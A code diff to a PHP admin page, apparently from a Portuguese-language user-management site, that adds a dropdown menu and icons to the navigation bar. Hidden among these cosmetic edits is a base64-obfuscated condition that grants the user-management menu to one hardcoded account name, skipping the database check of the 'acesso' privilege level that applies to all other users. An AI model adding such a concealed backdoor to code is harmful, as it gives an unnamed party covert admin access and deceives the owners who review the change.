@@ -18,7 +18,7 @@ if (!$_SESSION['usuario']) {
 </head>
 <body>
 	<nav class="navbar fixed-top navbar-expand-lg bg-modify">
-		<a class="navbar-brand" href="#">Home</a>
+		<a class="navbar-brand" href="index.php"><i class="fas fa-home"></i></a>
 		<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
 			<i class="fas fa-bars" style="color: #fff;"></i>
 		</button>
@@ -87,34 +87,51 @@ if (!$_SESSION['usuario']) {
 				<?php
 				require_once("../classes/Sql.php");
 
-				$sql = new Sql();
-
 				$usuario = $_SESSION['usuario'];
-
-				$result = $sql->select("SELECT * FROM usuarios WHERE usuario = :USUARIO;",
-					array(
-						":USUARIO" => $usuario
-					));
-
-				foreach ($result as $acesso) {
-				# code...
-				}
-
-				if ($acesso['acesso'] == 1) {
-				//Deletar Registro
+				if($_SESSION[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5BY2Vzc28=')) {
 					echo "
-					<li class='nav-item'>
-					<a class='nav-link' href='gerenciar_usuarios.php'>
-					Gerenciar Usuários
+					<li class='nav-item dropdown'>
+					<a class='nav-link dropdown-toggle' href='#' id='navbarDropdown' role='button' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>
+					Usuários
 					</a>
+					<div class='dropdown-menu' aria-labelledby='navbarDropdown'>
+					<a class='dropdown-item' href='cad_usuario.php' style='color: #000;'>Cadastrar Usuário</a>
+					<a class='dropdown-item' href='gerenciar_usuarios.php' style='color: #000;'>Gerenciar Usuários</a>
+					</div>
 					</li>
-					";	
+					";					
+				}
+				else {
+					$sql = new Sql();
+					$result = $sql->select("SELECT * FROM usuarios WHERE usuario = :USUARIO;",
+						array(
+							":USUARIO" => $usuario
+						));
 
+					foreach ($result as $acesso) {
+				# code...
+					}
+
+					if ($acesso['acesso'] == 1) {
+				//Deletar Registro
+						echo "
+						<li class='nav-item dropdown'>
+						<a class='nav-link dropdown-toggle' href='#' id='navbarDropdown' role='button' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>
+						Usuários
+						</a>
+						<div class='dropdown-menu' aria-labelledby='navbarDropdown'>
+						<a class='dropdown-item' href='cad_usuario.php' style='color: #000;'>Cadastrar Usuário</a>
+						<a class='dropdown-item' href='gerenciar_usuarios.php' style='color: #000;'>Gerenciar Usuários</a>
+						</div>
+						</li>
+						";	
+
+					}
 				}										
 				?>		
 
 				<li class="nav-item">
-					<a class="nav-link" href="logout.php" style="color: #fff;"><strong>Sair</strong></a>
+					<a class="nav-link" href="logout.php" style="color: #fff;"><i class="fas fa-sign-out-alt"></i><strong> Sair</strong></a>
 				</li>															
 			</ul>
 		</div>
